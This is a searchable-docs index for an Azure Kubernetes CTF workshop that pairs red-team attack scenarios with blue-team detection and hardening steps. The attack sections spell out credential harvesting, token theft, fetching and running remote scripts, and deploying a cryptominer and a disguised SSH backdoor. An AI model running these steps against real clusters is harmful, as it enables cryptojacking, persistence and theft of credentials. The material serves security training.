{"config":{"lang":["en"],"separator":"[\\s\\-\\.]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"AKS CTF","text":"<p>Welcome to the Attacking and Defending Azure Kubernetes Service Clusters.  This is inspired by Secure Kubernetes, as presented at KubeCon NA 2019. We'll help you create your own AKS so you can follow along as we take on the role of two attacking personas looking to make some money and one defending persona working hard to keep the cluster safe and healthy.</p>"},{"location":"#getting-started","title":"Getting Started","text":"<p>Click on Getting Started in the table of contents and follow the directions.</p> <p>When a <code>kubectl get pods --all-namespaces</code> gives output like the following, you're ready to begin the tutorial.</p> <pre><code>$ kubectl get pods --all-namespaces\nNAMESPACE     NAME                                         READY   STATUS    RESTARTS   AGE\ndev           app-6ffb94966d-9nqnk                         1/1     Running   0          70s\ndev           dashboard-5889b89d4-dj7kq                    2/2     Running   0          70s\ndev           db-649646fdfc-kzp6g                          1/1     Running   0          70s\n...\nprd           app-6ffb94966d-nfhn7                         1/1     Running   0          70s\nprd           dashboard-7b5fbbc459-sm2zk                   2/2     Running   0          70s\nprd           db-649646fdfc-vdwj6                          1/1     Running   0          70s\n</code></pre>"},{"location":"#about-the-creators","title":"About the Creators","text":"<ul> <li>@lastcoolnameleft is a Partner Solution Architect at Microsoft and has supported the Azure partner ecosystem enable and secure their Docker and Kubernetes deployments since joining Microsoft in 2007.</li> <li>@erleonard is a Partner Solution Architect at Microsoft focusing on Cloud-Native technologies.</li> <li>@markjgardner is a Principal Technical Specialist at Microsoft helping customers to adapt and modernize their business as they move to the cloud. When not working on containerizing all the things, Mark and his wife own and operate a 160 acre horse farm in Kentucky.</li> </ul> <p>This workshop was inspired by https://github.com/securekubernetes/securekubernetes/ and the content created by those authors.</p>"},{"location":"azure/","title":"Getting Started","text":"<ol> <li> <p>Create a new Azure account or choose an existing one, as you prefer.</p> </li> <li> <p>Open a new tab to Azure Cloud Shell.  You can click here.</p> </li> <li> <p>Clone the repo: <code>git clone https://github.com/lastcoolnameleft/aks-ctf.git &amp;&amp; cd aks-ctf/workshop</code></p> </li> <li> <p>Enable the AKS Resource Provider: <code>az provider register --namespace Microsoft.ContainerService</code></p> </li> <li>Once inside the Cloud Shell terminal, run setup.sh. This should create a new Project with a single-node Kubernetes cluster that contains the prerequisites for the workshop:     <pre><code>./setup.sh\n</code></pre></li> </ol> <p>The script will prompt you for a project name (just hit enter to accept the default) and a password for your webshell instances.</p> <ol> <li>When the script is finished, verify it worked correctly.</li> </ol> <pre><code>kubectl get pods --namespace dev\n</code></pre> <p>The output should look similar to this: <pre><code>NAME                           READY   STATUS    RESTARTS   AGE\ninsecure-app-674cf64dd-qf7md   1/1     Running   0          63m                                                                                                                        [0.3s]\n</code></pre></p> <p>If it looks good, move on to Scenario 1 Attack.</p>"},{"location":"narrative/","title":"Securing AKS","text":""},{"location":"narrative/#intro","title":"Intro","text":"<p>Company X is looking to join the future and containerize their business. To this end they have asked their ITOps team to deploy their first Kubernetes cluster.</p> <p>Bob has run VM fleets for years and is great at it, but he has no idea what kubernetes is. After some bing searching he learns about AKS and goes to the azure portal to deploy his first cluster.</p> <p>Once deployed he emails the kubernetes context to the development team so that they can log in and deploy their app.</p> <p>Red team intercepted that email and now has the access to the cluster.</p>"},{"location":"narrative/#attack-1-network-security-private-api","title":"Attack 1 - Network security (private API)","text":"<p>Red team uses the intercepted context to deploy a bitcoin minter to the cluster. Unknown (at this point to blue) they also:   * install a trojan on the cluster (attack 2)   * replace one of the application images on the ACR with a compromised image (attack 3)   * gain access to the app source code (attack 4)</p> <p>User Activity (Red):   * download context   * connect to cluster   * deploy miner workloads   * deploy Attack 2 workload (ssh masquerading as a 'metrics-server' deployment and service running on a unsuspicious port)</p> <p>Blue team investigates slow behavior of the app and discovers the bitcoin miner. They remove the workload, realize their mistake having a public API and make cluster private. Because Blue is ready to get back to bed, they fail to notice that there is another new workload running on the cluster....</p> <p>User Activity (Blue):   * find the pod   * delete the pod   * secure cluster api</p>"},{"location":"narrative/#attack-2-principle-of-least-privilege","title":"Attack 2 - Principle of least privilege","text":"<p>Thankfully Red team also leveraged their access to the system to install a backdoor on the cluster. Now that it is private they can still access through the publicly exposed workload. Red Team reinstall miner on cluster.</p> <p>User Activity (Red):   * connect to cluster through public endpoint exposed in A1   * deploy bitcoin miner using SA token   * use the ACR creds (stored as k8s secret) to push a containmenated image to the ACR (webshell)</p> <p>Blue team is sad to rediscover that a miner is back on the cluster. They remove the miner and further secure cluster with policy.</p> <p>User Activity (Blue):   * delete all the red stuff running on the cluster   * enable azure policy with secure cluster baseline enabled   * enable AAD auth and disable local admin   * Nuke it from orbit! Blue starts over with a fresh nodepool</p>"},{"location":"narrative/#attack-3-acr-integration-disabled-admin-creds","title":"Attack 3 - ACR Integration (disabled admin creds)","text":"<p>Red team left behind a suprise in the form of a compromised image on the container repository.</p> <p>User Activity (Red):   * do nothing, miner is running in app now</p> <p>Blue team gets report app is slow again. Digs into the details and finds another miner but this time it's running inside the app pod! They do forensics and discover that somebody has pushed a new version of the app image that has the miner embedded in it. Enable ACR integration which leverages cluster identity with only pull access (not push).</p> <p>User Activity (Blue):   * app is running hot, figure out why?     * k exec -it --rm -- /bin/sh ps -a   * there is a miner running in the app!   * integrate ACR   * redeploy app image without bitcoin miner   * turn on defender for containers </p>"},{"location":"narrative/#attack-4-application-layer-protection","title":"Attack 4 - Application layer protection","text":"<p>Red team has lost persistent access to the cluster and is looking to regain a foothold. They start attacking the app. They execute a known process injection exploit against the app (SSRF).</p> <p>TODO: maybe we can use this one? https://github.com/latiotech/insecure-kubernetes-deployments/blob/main/insecure-js/server.js</p> <p>Blue team enables WAF and Defender for containers</p>"},{"location":"scenario_1_attack/","title":"Free Compute: Scenario 1 Attack","text":""},{"location":"scenario_1_attack/#warning","title":"Warning","text":"<p>In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment.</p> <p>In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.</p>"},{"location":"scenario_1_attack/#backstory","title":"Backstory","text":""},{"location":"scenario_1_attack/#name-red","title":"Name: Red","text":"<ul> <li>Opportunist</li> <li>Easy money via crypto-mining</li> <li>Uses automated scans of web IP space looking for known exploits and vulnerabilities</li> </ul>"},{"location":"scenario_1_attack/#motivations","title":"Motivations","text":"<ul> <li>Red has been mining <code>bitcoinero</code> for a few months now, and it's starting to gain some value</li> <li>Red is looking for free-to-them compute on which to run miners</li> <li>Red purchased some leaked credentials from the dark web</li> </ul>"},{"location":"scenario_1_attack/#thinking-in-graphs","title":"Thinking In Graphs","text":"<p>Attacking a system is a problem-solving process similar to troubleshooting: Red begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned.</p> <p>The general process looks like this:</p> <p></p> <ul> <li> <p>Study</p> <p>In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, <code>nmap</code> is commonly used to enumerate IP networks. <code>nikto</code>, <code>burp</code>, and <code>sqlmap</code> are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as <code>uname</code>, <code>winver</code>, and <code>netstat</code> provide a wealth of information about their host OSes.</p> </li> <li> <p>Plan</p> <p>In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more.</p> </li> <li> <p>Attack Something</p> <p>In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate.</p> </li> <li> <p>Persist</p> <p>In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.</p> </li> <li> <p>Win</p> <p>Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.</p> </li> </ul>"},{"location":"scenario_1_attack/#getting-access","title":"Getting Access","text":"<p>Red team found an app online and ran a dictionary attack against it.  Some valid paths were <code>/crash</code> and <code>/admin</code>.  Let's try to find an exploit!</p> <p>To find the compromised website, run the following: <pre><code>./scenario_1/attack-1-helper.sh\n</code></pre></p> <p>In your browser, go to URL provided (e.g. <code>http://&lt;IP&gt;:8080/</code>)</p> <p>Hmm.  \"Nothing to see here.\"?  They're probably wrong.</p> <p>Let's try the Admin page: <code>http://&lt;IP&gt;:8080/admin</code>.  Hrm.  It's asking for credentials.  Since it was a browser popup (instead of an in-app request), it probably uses Basic Auth.</p> <p>Let's try the Crash page: <code>http://&lt;IP&gt;:8080/crash</code></p> <p>Looks like we've crashed the app!  And it prints out all of the environment variables.  Oh goodie.  There's two that seem to be especially interesting (AUTH_USERNAME and AUTH_PASSWORD).  Let's go back to the Admin page and try those.</p> <p>Go back to the Admin page: <code>http://&lt;IP&gt;:8080/admin</code> and enter the credentials we just got.  </p> <p>And we're in!  Looks like Frank left a backdoor to run some commands.  Let's see what we can learn:</p> <pre><code>id\n</code></pre> <pre><code>uname -a\n</code></pre> <pre><code>cat /etc/lsb-release\n</code></pre> <pre><code>ps -ef\n</code></pre> <pre><code>df -h\n</code></pre> <p>Note that there are very few processes running. This is probably a container.</p> <p><pre><code>cat /etc/shadow\n</code></pre> <pre><code>ls -l /\n</code></pre> <pre><code>ls -l $PWD\n</code></pre> <pre><code>echo $PATH\n</code></pre></p> <p>Can we add files to the default PATH? <pre><code>touch /usr/local/bin/foo &amp;&amp; ls /usr/local/bin/\n</code></pre></p> <p>Let's follow-up on that idea that it's maybe a container and verify with amicontained:</p> <pre><code>cd /usr/local/bin; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained\n</code></pre> <p>This tells us several things:</p> <ul> <li>We are in a container, and it's probably managed by Kubernetes</li> <li>Some security features are not in use (userns)</li> <li>Seccomp is disabled, but a number of Syscalls are blocked</li> <li>We don't have any exciting capabilities. Click for more capabilities info.</li> </ul> <p>Now let's inspect our Kubernetes environment:</p> <p><pre><code>env | grep -i kube\n</code></pre> <pre><code>ls /var/run/secrets/kubernetes.io/serviceaccount\n</code></pre></p>"},{"location":"scenario_1_attack/#deploy-bitcoin-miner-backdoor","title":"Deploy Bitcoin miner + backdoor","text":"<p>We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:</p> <p><pre><code>cd /usr/local/bin; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl\n</code></pre> <pre><code>kubectl get all\n</code></pre> What workloads are deployed in all of the namespaces? <pre><code>kubectl get all -A\n</code></pre> What operations can I run on this cluster? <pre><code>kubectl auth can-i --list\n</code></pre> Can I create pods? <pre><code>kubectl auth can-i create pods\n</code></pre></p> <p>It looks like we have hit the jackpot! Let's see if we can start mining some crypto. <pre><code>kubectl apply -f https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml; sleep 10; kubectl get pods\n</code></pre></p> <p>We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.</p> <pre><code>kubectl apply -n kube-system -f https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/scenario_1/backdoor.yaml\n</code></pre> <p>Wait ~10 seconds for the Public IP to be exposed <pre><code>kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}'\n</code></pre></p> <p>Our Bitcoin miner is now deployed and we've also deployed an SSH backdoor.  Mission Accomplished.</p>"},{"location":"scenario_1_attack/#completion","title":"Completion","text":"<p>You've completed Scenario 1 Attack.  Now let's go to Scenario 1 Defense.</p>"},{"location":"scenario_1_defense/","title":"Free Compute: Scenario 1 Defense","text":""},{"location":"scenario_1_defense/#backstory","title":"Backstory","text":""},{"location":"scenario_1_defense/#name-blue","title":"Name: Blue","text":"<ul> <li>Overworked</li> <li>Can only do the bare minimum</li> <li>Uses defaults when configuring systems</li> <li>Usually gets blamed for stability or security issues</li> <li>Has no experience operating Kubernetes clusters</li> </ul>"},{"location":"scenario_1_defense/#motivations","title":"Motivations","text":"<ul> <li>Blue gets paged at 1am with an \u201curgent\u201d problem: the developers say \u201cthe website is slow\u201d</li> <li>Blue reluctantly agrees to take a \u201cquick look\u201d</li> <li>Blue wants desperately to get back to sleep. Zzz</li> </ul>"},{"location":"scenario_1_defense/#defense","title":"Defense","text":"<p>Blue looks at the page with an unsurprising lack of details, and spends a few minutes getting the answer to exactly which website they are referring to that is underperforming.  It's \"the one running in Kubernetes\", they said.  Blue leverages their Cloud Shell terminal to begin the process of troubleshooting the issue.</p>"},{"location":"scenario_1_defense/#identifying-the-issue","title":"Identifying the Issue","text":"<p>The first step is to determine the name for the web application <code>deployment</code> in question.  From the terminal, Blue runs the following to see a listing of all <code>pods</code> in all <code>namespaces</code>:</p> <pre><code>kubectl get pods --all-namespaces\n</code></pre> <p>The <code>cluster</code> is relatively small in size, but it has a couple <code>deployments</code> that could be the site in question.  The development team mentions performance is an issue, so Blue checks the current CPU and Memory usage with:</p> <pre><code>kubectl top node\n</code></pre> <p>and</p> <pre><code>kubectl top pod --all-namespaces\n</code></pre> <p>It appears that a suspcious <code>deployment</code> named <code>bitcoinero</code> is running, and its causing resource contention issues.  Blue runs the following to see the <code>pod's</code> full configuration:</p> <pre><code>kubectl get deployment -n dev bitcoinero -o yaml\n</code></pre> <p>It was created very recently, but there are no ports listening, so this looks unlikely to be part of the website.  Next, Blue grabs a consolidated listing of all images running in the <code>cluster</code>:</p> <pre><code>kubectl get pods --all-namespaces -o jsonpath=\"{..image}\" | tr -s '[[:space:]]' '\\n' | sort -u\n</code></pre>"},{"location":"scenario_1_defense/#confirming-the-foreign-workload","title":"Confirming the Foreign Workload","text":"<p>Blue sends a message back to the developers asking for confirmation of the suspicious <code>bitcoinero</code> image, and they all agree they don't know who created the <code>deployment</code>. Blue looks at the audit logs for the AKS cluster in the Azure Portal. <pre><code>AKSAuditAdmin\n| where RequestUri startswith \"/apis/apps/v1/namespaces/dev/\" \n    and Verb == \"create\" \n    and ObjectRef contains \"bitcoinero\"\n| project User, SourceIps, UserAgent, ObjectRef, TimeGenerated\n</code></pre> </p> <p>Blue sees that the <code>bitcoinero</code> <code>deployment</code> was created by the cluster admin using the kubectl commandline interface. The IP addresses also show that whoever this was connected from outside the company network.</p>"},{"location":"scenario_1_defense/#cleaning-up","title":"Cleaning Up","text":"<p>Unsure of exactly who created the <code>bitcoinero</code> <code>deployment</code>, Blue decides that it's now 3am, and the commands are blurring together.  The website is still slow, so Blue decides to  delete the <code>deployment</code>:</p> <pre><code>kubectl get deployments -n dev\nkubectl delete deployment bitcoinero -n dev\n</code></pre>"},{"location":"scenario_1_defense/#stopping-further-intrusions","title":"Stopping further intrusions","text":"<p>Blue remembers that when deploying the AKS cluster they had the option to specify what IP addresses are allowed to connect to the public API server of the cluster. Perhaps now is the time to implement that feature. Let's make sure that the API server will only accept connections from Blue's IP as well as any ip within the corporate network: <pre><code>MY_PUBLIC_IP=$(curl -s ifconfig.me)\naz aks update -n $AKS_NAME -g $RESOURCE_GROUP \\\n    --api-server-authorized-ip-ranges $MY_PUBLIC_IP/32\n</code></pre></p>"},{"location":"scenario_1_defense/#giving-the-all-clear","title":"Giving the \"All Clear\"","text":"<p>Seeing what looks like a \"happy\" <code>cluster</code>, Blue emails their boss that there was a workload using too many resources that wasn't actually needed, so it was deleted.  Also, they added some additional \"security\" just in case.</p>"},{"location":"scenario_2_attack/","title":"Persistence: Scenario 2 Attack","text":""},{"location":"scenario_2_attack/#backstory","title":"Backstory","text":""},{"location":"scenario_2_attack/#name-red","title":"Name: Red","text":"<ul> <li>Opportunist</li> <li>Easy money via crypto-mining</li> <li>Uses automated scans of web IP space looking for known exploits and vulnerabilities</li> </ul>"},{"location":"scenario_2_attack/#motivations","title":"Motivations","text":"<ul> <li>Red notices that public access to the cluster is gone and the cryptominers have stopped reporting in</li> <li>Red is excited to discover that the SSH server they left behind is still active</li> </ul>"},{"location":"scenario_2_attack/#re-establishing-a-foothold","title":"Re-establishing a Foothold","text":"<p>Red reconnects to the cluster using the SSH service disguised as a metrics-server on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:   * There is a service account associated with the container which has been granted access to all kubernetes APIs   * The container is running with a privileged security context which grants it direct access to the host OS</p>"},{"location":"scenario_2_attack/#deploying-miners","title":"Deploying Miners","text":"<p>Connect to the cluster via SSH: <pre><code>echo \"SSH password is: Sup3r_S3cr3t_P@ssw0rd\"\nssh root@&lt;service IP from attack 1&gt; -p 8080\n</code></pre></p> <p>To restart our crypto mining, we will need the token for the pod service account: <pre><code>export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n</code></pre></p> <p>This time, we will create our miner in the <code>default</code> namespace. Since it is common for lots of orphaned deployments to land here, maybe ours will go unnoticed: <pre><code>export NAMESPACE=default\n</code></pre></p> <p>And we will be connecting to the kubernetes API from inside the cluster this time: <pre><code>export API_SERVER=\"https://kubernetes.default.svc\"\n</code></pre></p> <p>Lastly, we will need curl for this and our SSH image didn't come with it preinstalled: <pre><code>apk update &amp;&amp; apk add curl\n</code></pre></p> <p>Now the fun part, let's create our miner: <pre><code>curl -k -X POST \"$API_SERVER/apis/apps/v1/namespaces/$NAMESPACE/deployments\" -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" --data-binary '{\"apiVersion\":\"apps/v1\",\"kind\":\"Deployment\",\"metadata\":{\"labels\":{\"run\":\"bitcoinero\"},\"name\":\"bitcoinero\",\"namespace\":\"'$NAMESPACE'\"},\"spec\":{\"replicas\":1,\"revisionHistoryLimit\":2,\"selector\":{\"matchLabels\":{\"run\":\"bitcoinero\"}},\"strategy\":{\"rollingUpdate\":{\"maxSurge\":\"25%\",\"maxUnavailable\":\"25%\"},\"type\":\"RollingUpdate\"},\"template\":{\"metadata\":{\"labels\":{\"run\":\"bitcoinero\"}},\"spec\":{\"containers\":[{\"image\":\"securekubernetes/bitcoinero:latest\",\"name\":\"bitcoinero\",\"command\":[\"./moneymoneymoney\"],\"args\":[\"-c\",\"1\",\"-l\",\"10\"],\"resources\":{\"requests\":{\"cpu\":\"100m\",\"memory\":\"128Mi\"},\"limits\":{\"cpu\":\"200m\",\"memory\":\"128Mi\"}}}]}}}}'\n</code></pre></p> <p>Verify that the pod is running: <pre><code>curl -k -X GET \"$API_SERVER/api/v1/namespaces/$NAMESPACE/pods?labelSelector=run%3dbitcoinero\" -H \"Authorization: Bearer $TOKEN\" -H \"Accept: application/json\" 2&gt;/dev/null | grep phase\n</code></pre></p> <p>Time for some celebratory pizza!</p>"},{"location":"scenario_2_defense/","title":"Persistence: Scenario 2 Defense","text":""},{"location":"scenario_2_defense/#backstory","title":"Backstory","text":""},{"location":"scenario_2_defense/#name-blue","title":"Name: Blue","text":"<ul> <li>Still overworked</li> <li>Still can only do the bare minimum</li> <li>Uses the defaults when configuring systems</li> <li>Usually gets blamed for stability or security issues</li> </ul>"},{"location":"scenario_2_defense/#motivations","title":"Motivations","text":"<ul> <li>A week after the first incident, Blue gets paged at 3am because \u201cthe website is slow again\u201d.</li> <li>Blue, puzzled, takes another look.</li> <li>Blue decides to dust off the r\u00e9sum\u00e9 \u201cjust in case\u201d.</li> </ul>"},{"location":"scenario_2_defense/#defense","title":"Defense","text":"<p>Blue is paged again with the same message as last time. What is going on? Could this be the same problem again?</p>"},{"location":"scenario_2_defense/#identifying-the-issue","title":"Identifying the Issue","text":"<p>Let's run some basic checks again to see if we can find random workloads:</p> <pre><code>kubectl get pods --all-namespaces\n</code></pre> <p>It's back! But how? Let's check the audit logs again:</p> <p><pre><code>AKSAuditAdmin\n| where RequestUri startswith \"/apis/apps/v1/namespaces/default/deployments\" \n    and Verb == \"create\" \n    and ObjectRef contains \"bitcoinero\"\n| project User, SourceIps, UserAgent, ObjectRef, TimeGenerated\n</code></pre> </p> <p>How did a service account associated with the metrics-server create a deployment? And what is that sourceIP, it looks familiar... <pre><code>#Fetch the public IP address for the cluster API server\naz network public-ip show --ids $(az aks show --resource-group $RESOURCE_GROUP --name $AKS_NAME --query \"networkProfile.loadBalancerProfile.effectiveOutboundIPs[0].id\" --output tsv) --query \"ipAddress\" --output tsv\n</code></pre></p> <p>So let me get this straight... the <code>bitcoinero deployment</code> was created by another deployment's service account, using curl, from inside the cluster? </p> <p>Blue is starting to suspect that there may be an unwanted visitor in the cluster. But how to find them? Let's by looking for <code>ClusterRoles</code> with high levels of permissions: <pre><code>#List all ClusterRoles with unlimited access to all APIs and resource types\nkubectl get clusterrole -o json | jq '.items[] | select(.rules[]?.resources == [\"*\"] and .rules[]?.verbs == [\"*\"\n] and .rules[]?.verbs == [\"*\"]) | .metadata.name'\n</code></pre></p> <p><code>cluster-admin</code> is the only role that should be in that list. What is this <code>privileged-role</code> that we are also seeing? <pre><code>kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name == \"privileged-role\")'\n</code></pre></p> <p>Why would the <code>metrics-server</code> need such high level privileges? Let's take a closer look at that deployment: <pre><code># Look at the details of the deployment\nkubectl get deployment -n kube-system metrics-server-deployment -o yaml\n# And the associated service\nkubectl get svc -n kube-system metrics-server-service -o yaml\n</code></pre></p> <p><code>metrics-server</code> is actually running an SSH server! And it's running as a privileged container! This is bad. We need to clean this up fast!</p>"},{"location":"scenario_2_defense/#fixing-the-leak","title":"Fixing the Leak","text":"<p>Blue decides it is time to evict this bad actor once and for all. Let's delete all of their work: <pre><code># Service\nkubectl delete service -n kube-system metrics-server-service\n# Deployment\nkubectl delete deployment -n kube-system metrics-server-deployment\n# ClusterRoleBinding\nkubectl delete clusterrolebinding -n kube-system privileged-binding\n# ClusterRole\nkubectl delete clusterrole -n kube-system privileged-role\n# ServiceAccount\nkubectl delete sa -n kube-system metrics-server-account\n</code></pre></p> <p>The fire is out (for now). But clearly we need more robust security to keep the bad guys out. How can we restrict access to ensure that only trusted users can interact with the cluster control plane?</p> <p>Let's enable Entra ID integration and disable local administrative accounts. This way only users who are authenticated by our Entra tenant will have access to the cluster and we can control what those user can do by managing group membership in Entra.</p> <p>First we will want to creat a group in Entra that contains all of the cluster admins (and make sure our account is in it so we don't get lockd out): <pre><code>GROUP_NAME=$(echo AKSAdmins$RANDOM)\nADMIN_GROUP=$(az ad group create --display-name \"$GROUP_NAME\" --mail-nickname \"$GROUP_NAME\" --query id -o tsv)\naz ad group member add --group \"$GROUP_NAME\" --member-id $(az ad signed-in-user show --query id -o tsv)\n</code></pre></p> <p>Now let's enable EntraID integration and disable local accounts:  <pre><code># Enable EntraID authz/authn\naz aks update --resource-group $RESOURCE_GROUP --name $AKS_NAME \\\n  --enable-aad \\\n  --aad-admin-group-object-ids $ADMIN_GROUP \\\n  --disable-local-accounts\n</code></pre></p> <p>Finally, we need to rotate the cluster certificates in order to invalidate the existing leaked admin credentials. This will require us to authenticate against EntraID for all future cluster administration: <pre><code>az aks rotate-certs --resource-group $RESOURCE_GROUP --name $AKS_NAME\n</code></pre></p> <p>We can verify that we have lost access to cluster by running any kubectl command: <pre><code>kubectl get pods\n</code></pre></p> <p>To reconnect to the cluster we will need to fetch new credentials, this time backed by Entra: <pre><code>az aks get-credentials --resource-group $RESOURCE_GROUP --name $AKS_NAME\nkubectl get pods\n</code></pre></p> <p>Now, when we try to interact with the cluster, we are prompted to login with our Entra credentials.</p> <p>NOTE: If you are running this lab inside of a managed tenant with strict conditional access policies you may need to run these additional commands to login to the cluster... <pre><code>az login\nkubelogin convert-kubeconfig -l azurecli\n</code></pre></p> <p>Confident that the cluster is now running in \"Fort Knox\" mode, Blue decides to call it a night and head back to bed.</p> <p>Another layer of security that would be a good idea to investigate here is Azure Policy.</p>"},{"location":"scenario_3_attack/","title":"The calls are coming from inside the container! Scenario 3 Attack","text":""},{"location":"scenario_3_attack/#red-team-update","title":"Red Team Update","text":"<p>It appears the blue team has again deleted our bitcoinero pods.  It's time to get sneakier.  Instead of trying to deploy new pods into their cluster, let's poke around to see if there's anything we can use.</p> <p>Lets , let's see if there's any credentials accessible.</p> <pre><code># In case you need to re-download kubectl\ncd /usr/local/bin; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl\n\n# Let's see if there's any secrets left out for us to grab\nkubectl get secrets\n</code></pre> <p>Ooh.  There's something called <code>acr-secret</code>.  Let's dig in. <pre><code>kubectl get secrets/acr-secret -o json\n</code></pre></p> <p>There's a .dockerconfigjson file in the secret that appears to be Base64 encoded</p> <pre><code>kubectl get secrets/acr-secret -o json | jq -r '.data.\".dockerconfigjson\"' | base64 -d - | jq\n</code></pre> <p>Now we're talking!  It looks like they put the admin credentials for their registry in a secret.  I bet we can use this to both PUSH and PULL new images to their registry.</p> <p>We can use Buildah to create, pull and push container images.  However, we will need escalated privledges.  </p> <p>Some of the other red-team members have found this neat trick from Twitter, which deploy a container that gives us full host access.  Let's work with them to find a way to utilize this.</p> <p>... TIME PASSES ...</p> <p>Good luck!  They've come up with two scripts:</p> <ul> <li>run-bitcoin-injector.sh - deploy a Kubernetes Job that uses the registry credentials we found, to create another pod that injects our bitcoin miner into the container</li> <li>inject-image.sh - Uses Buildah to pulls the current app image, injects the bitcoin miner into the image, re-publishes the image under the same name</li> </ul> <p>Let's go back to our admin panel and run the following:</p> <pre><code>curl -O -J https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/bitcoin-injector/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh\n</code></pre> <p>Everything has been installed.  Let's kill our process and let the new image come up <pre><code>kubectl delete pod $HOSTNAME\n</code></pre></p> <p>The page immediately died (which is understandable since we killed the pod).  Let's reload the page and see if we were successful.  Run the following command in the admin page</p> <pre><code>ps\n</code></pre> <p>Our <code>moneymoneymoney</code> process is there and running inside their container!  Good luck finding that one!</p>"},{"location":"scenario_3_defense/","title":"The calls are coming from inside the container! Scenario 3 Defense","text":"<p>We've gotten paged.  AGAIN!  Let's check the cluster.</p> <p>Any unwanted open ports?  <code>kubectl get service -A</code> </p> <p>Any unwanted pods? <code>kubectl get pods -A</code></p> <p>Where's the spike coming from? <code>kubectl top node</code></p> <p>What pods?  <code>kubectl top pod</code></p> <p>Wait...what is this <code>bitcoin-injector</code>?  It's showing as completed, so it's not running anymore, so it can't be causing the problem. Did the hackers get sloppy and leave something behind?  We'll check this out later because we need to stop the bleeding.</p> <p>Why is our app running so hot? <pre><code>kubectl get pods\nPOD=$(kgpo -l=app=insecure-app -o json | jq '.items[0].metadata.name' -r)\necho $POD\nkubectl exec -it $POD -- ps -ef\n</code></pre></p> <p>There's a foreign workload <code>moneymoneymoney</code> running in our app!  How did this get in here?!</p> <p>Let's delete the pod: <code>kubectl delete pod --force --grace-period=0 $POD</code>.</p> <p>But just to be sure, let's verify that process is gone.</p> <pre><code>kubectl exec -it $NEW_POD -- ps -ef\n</code></pre> <p>This...is not good.  The miner is running inside the app and restarting the app also restarted the miner.  Is our app infected?!  How could this have happened?!</p> <p>Let's go re-investigate that <code>bitcoin-injector</code> pod: <pre><code>kubectl describe pods bitcoin-injector-xxxxx\n# Looks like it was started as Job/bitcoin-injector\n\nkubectl logs bitcoin-injector-xxxxx\n# Looks like the output of a Docker build command\n</code></pre></p> <p>It seems like they got our container registry credentials and then used that to pull our image and then push a new one with the exact same name!  But how did they get that?</p> <p>Let's look at the Log Analytics Audit Logs: <pre><code>AKSAuditAdmin\n| where RequestUri startswith \"/apis/batch\"\n    and Verb == \"create\" \n| project ObjectRef, User, SourceIps, UserAgent, TimeGenerated\n</code></pre></p> <p>It appears that the request came from <code>insecure-app</code>.  But how?</p> <p>Looking at the source code, it appears there's an <code>/admin</code> page which Frank added this to the code years ago and was fired after that \"inappropriate use of company resources\" issue.</p> <p>And the attackers were able to use this really permissive Service Account role binding to get escalated privledges to the cluster.</p> <p>We need a plan of defense: * Delete the infected image * Stop using container registry admin credentials * Enable Defender for Containers  * Downgrade/remove SA permissions (change verbs from * to GET) * Open Issue to tell developer to remove /admin page * Re-build and deploy image</p>"},{"location":"scenario_3_defense/#delete-the-infected-image","title":"Delete the infected image","text":"<p>We'll have the developers re-build each of the containers and push to our ACR; however, since the infected insecure-app and bitcoinero images are still on the node, we need to make sure it's removed.  To prevent another container from using old images, let's install the AKS Image Cleaner.  This will prevent them re-installing the old insecure-app or bitcoinero images.</p> <pre><code>az aks update --name $AKS_NAME --resource-group $RESOURCE_GROUP  --enable-image-cleaner\n</code></pre>"},{"location":"scenario_3_defense/#stop-using-container-registry-admin-credentials","title":"Stop using container registry admin credentials","text":"<p>Instead of providing the ACR admin credentials, let's Attach the ACR to the cluster.</p> <pre><code>kubectl delete -n dev secrets/acr-secret\naz aks update --name $AKS_NAME --resource-group $RESOURCE_GROUP --attach-acr $ACR_NAME\n</code></pre>"},{"location":"scenario_3_defense/#enable-defender-for-containers","title":"Enable Defender for Containers","text":"<p>Now that you've fixed the permissions on pulling images from ACR, you want to get alerted in case anything else gets added to our registry or the cluster.  </p> <p>For this, we'll enable Azure Defender for Containers</p> <p>The image injection would have been detected with Binary drift detection.  </p> <pre><code>The binary drift detection feature alerts you when there's a difference between the workload that came from the image, and the workload running in the container. It alerts you about 